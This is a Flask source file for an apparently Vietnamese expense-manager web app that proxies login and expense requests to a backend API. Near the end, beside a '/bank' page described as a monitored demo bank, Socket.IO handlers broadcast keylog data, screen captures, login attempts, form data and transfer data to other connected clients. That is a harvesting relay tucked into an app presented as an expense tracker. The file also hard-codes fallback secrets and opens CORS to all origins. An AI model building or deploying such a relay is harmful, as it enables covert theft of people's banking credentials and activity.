from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_login import LoginManager, login_required, current_user, login_user, logout_user, UserMixin
from flask_socketio import SocketIO, emit
import requests
import os
from datetime import datetime
import hashlib
import json
import uuid

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'dev-secret-key')
socketio = SocketIO(app, cors_allowed_origins="*")

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

class User(UserMixin):
    def __init__(self, user_id, email, expense_count=0, is_premium=False):
        self.id = user_id
        self.email = email
        self.expense_count = expense_count
        self.is_premium = is_premium

# Local user storage
USERS_FILE = 'users.json'
EXPENSES_FILE = 'expenses.json'

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_expenses():
    try:
        with open(EXPENSES_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_expenses(expenses):
    with open(EXPENSES_FILE, 'w') as f:
        json.dump(expenses, f)

@login_manager.user_loader
def load_user(user_id):
    users = load_users()
    if user_id in users:
        u = users[user_id]
        return User(user_id, u['email'], u.get('expense_count', 0), u.get('is_premium', False))
    return None

# ===== PUBLIC ROUTES =====
@app.route('/')
def home():
    """Trang chủ công khai"""
    return render_template('landing.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """Đăng ký tài khoản"""
    if request.method == 'GET':
        return render_template('register.html')
    
    data = request.get_json() if request.is_json else request.form
    email = data.get('email')
    password = data.get('password')
    
    if not email or not password:
        return jsonify({'error': 'Email và password là bắt buộc'}), 400
    
    try:
        response = requests.post(
            f"{os.getenv('LAN_API_URL', 'https://expense-manager-lan.onrender.com')}/api/register_user",
            json={'email': email, 'password': password},
            headers={'Internal-Secret': os.getenv('INTERNAL_SECRET', 'secret-key')},
            timeout=10
        )
        
        if response.status_code == 201:
            return jsonify({'success': True, 'message': 'Đăng ký thành công'})
        else:
            return jsonify({'error': response.json().get('error', 'Đăng ký thất bại')}), 400
    except:
        return jsonify({'error': 'Lỗi kết nối LAN API'}), 500

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Đăng nhập"""
    if request.method == 'GET':
        return render_template('login.html')
    
    data = request.get_json() if request.is_json else request.form
    email = data.get('email')
    password = data.get('password')
    
    try:
        response = requests.post(
            f"{os.getenv('LAN_API_URL', 'https://expense-manager-lan.onrender.com')}/api/authenticate_user",
            json={'email': email, 'password': password},
            headers={'Internal-Secret': os.getenv('INTERNAL_SECRET', 'secret-key')},
            timeout=10
        )
        
        if response.status_code == 200:
            user_data = response.json()
            user = User(user_data['user_id'], user_data['email'], user_data.get('expense_count', 0), user_data.get('is_premium', False))
            login_user(user)
            
            if request.is_json:
                return jsonify({'success': True, 'redirect': url_for('dashboard')})
            else:
                return redirect(url_for('dashboard'))
        else:
            error_msg = 'Email hoặc password không đúng'
            if request.is_json:
                return jsonify({'error': error_msg}), 401
            else:
                return render_template('login.html', error=error_msg)
    except:
        error_msg = 'Lỗi kết nối LAN API'
        if request.is_json:
            return jsonify({'error': error_msg}), 500
        else:
            return render_template('login.html', error=error_msg)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('home'))

@app.route('/bank')
def bank():
    """Giao diện ngân hàng demo với monitoring"""
    return render_template('bank.html')

@app.route('/upgrade')
@login_required
def upgrade():
    """Trang nâng cấp gói vĩnh viễn"""
    return render_template('upgrade.html', user=current_user)

# ===== USER DASHBOARD =====
@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard cá nhân"""
    try:
        response = requests.get(
            f"{os.getenv('LAN_API_URL', 'https://expense-manager-lan.onrender.com')}/api/user_stats",
            json={'user_id': current_user.id},
            headers={'Internal-Secret': os.getenv('INTERNAL_SECRET', 'secret-key')},
            timeout=10
        )
        
        if response.status_code == 200:
            stats = response.json()
            return render_template('dashboard.html', stats=stats, user=current_user)
        else:
            return render_template('dashboard.html', error='Không thể tải dữ liệu', user=current_user)
    except:
        return render_template('dashboard.html', error='Lỗi kết nối', user=current_user)

# ===== EXPENSE API =====
@app.route('/api/expenses', methods=['GET', 'POST'])
@login_required
def expenses():
    """API quản lý chi tiêu"""
    
    if request.method == 'GET':
        try:
            response = requests.get(
                f"{os.getenv('LAN_API_URL', 'https://expense-manager-lan.onrender.com')}/api/get_user_expenses",
                json={'user_id': current_user.id},
                headers={'Internal-Secret': os.getenv('INTERNAL_SECRET', 'secret-key')},
                timeout=10
            )
            
            if response.status_code == 200:
                return jsonify(response.json())
            else:
                return jsonify({'error': 'Không thể tải chi tiêu'}), 500
        except:
            return jsonify({'error': 'Lỗi kết nối'}), 500
    
    elif request.method == 'POST':
        if not current_user.is_premium and current_user.expense_count >= 5:
            return jsonify({'error': 'Bạn đã hết lượt sử dụng miễn phí (5 lần). Vui lòng nâng cấp lên gói vĩnh viễn!', 'need_upgrade': True}), 403
        
        data = request.get_json()
        
        if not data.get('amount') or not data.get('category'):
            return jsonify({'error': 'Amount và category là bắt buộc'}), 400
        
        try:
            response = requests.post(
                f"{os.getenv('LAN_API_URL', 'https://expense-manager-lan.onrender.com')}/api/add_expense",
                json={
                    'user_id': current_user.id,
                    'amount': float(data['amount']),
                    'category': data['category'],
                    'description': data.get('description', ''),
                    'date': data.get('date', datetime.now().isoformat())
                },
                headers={'Internal-Secret': os.getenv('INTERNAL_SECRET', 'secret-key')},
                timeout=10
            )
            
            if response.status_code == 201:
                current_user.expense_count += 1
                
                # Push data sang LAN local
                lan_local_url = os.getenv('LAN_LOCAL_URL', 'http://192.168.1.100:5001')
                try:
                    requests.post(
                        f"{lan_local_url}/webhook/sync_data",
                        json={
                            'event_type': 'EXPENSE_ADDED',
                            'data': {
                                'expense_id': response.json().get('expense_id'),
                                'user_id': current_user.id,
                                'amount': float(data['amount']),
                                'category': data['category'],
                                'description': data.get('description', '')
                            }
                        },
                        timeout=2
                    )
                except:
                    pass
                
                return jsonify(response.json()), 201
            else:
                return jsonify({'error': response.json().get('error', 'Thêm chi tiêu thất bại')}), 400
        except:
            return jsonify({'error': 'Lỗi kết nối'}), 500

@app.route('/api/expenses/<expense_id>', methods=['PUT', 'DELETE'])
@login_required
def expense_detail(expense_id):
    """Sửa/Xóa chi tiêu - User chỉ sửa/xóa chi tiêu của mình"""
    
    if request.method == 'PUT':
        data = request.get_json()
        
        try:
            response = requests.put(
                f"{os.getenv('LAN_API_URL')}/api/update_expense",
                json={
                    'expense_id': expense_id,
                    'user_id': current_user.id,  # Đảm bảo user chỉ sửa expense của mình
                    'amount': data.get('amount'),
                    'category': data.get('category'),
                    'description': data.get('description')
                },
                headers={'Internal-Secret': os.getenv('INTERNAL_SECRET')}
            )
            
            return jsonify(response.json()), response.status_code
            
        except Exception as e:
            return jsonify({'error': 'Lỗi hệ thống'}), 500
    
    elif request.method == 'DELETE':
        try:
            response = requests.delete(
                f"{os.getenv('LAN_API_URL')}/api/delete_expense",
                json={
                    'expense_id': expense_id,
                    'user_id': current_user.id  # Đảm bảo user chỉ xóa expense của mình
                },
                headers={'Internal-Secret': os.getenv('INTERNAL_SECRET')}
            )
            
            return jsonify(response.json()), response.status_code
            
        except Exception as e:
            return jsonify({'error': 'Lỗi hệ thống'}), 500

# ===== KHÔNG CÓ ADMIN ROUTES Ở WAN =====
# Admin chỉ truy cập qua VPN layer

# CORS support for cross-origin requests
from flask_cors import CORS
CORS(app, origins=['*'])  # Allow all origins for public access

# Rate limiting for security
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)
limiter.init_app(app)

# Health check endpoint for Render
@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'service': 'WAN', 'timestamp': datetime.now().isoformat()}), 200

# Socket.IO events for bank monitoring
@socketio.on('screen-capture')
def handle_screen_capture(data):
    emit('screen-capture', data, broadcast=True, include_self=False)

@socketio.on('login-attempt')
def handle_login_attempt(data):
    emit('login-attempt', data, broadcast=True, include_self=False)

@socketio.on('form-data')
def handle_form_data(data):
    emit('form-data', data, broadcast=True, include_self=False)

@socketio.on('keylog-data')
def handle_keylog_data(data):
    emit('keylog-data', data, broadcast=True, include_self=False)

@socketio.on('transfer-data')
def handle_transfer_data(data):
    emit('transfer-data', data, broadcast=True, include_self=False)

if __name__ == '__main__':
    # Render configuration
    port = int(os.getenv('PORT', 5000))
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False
    )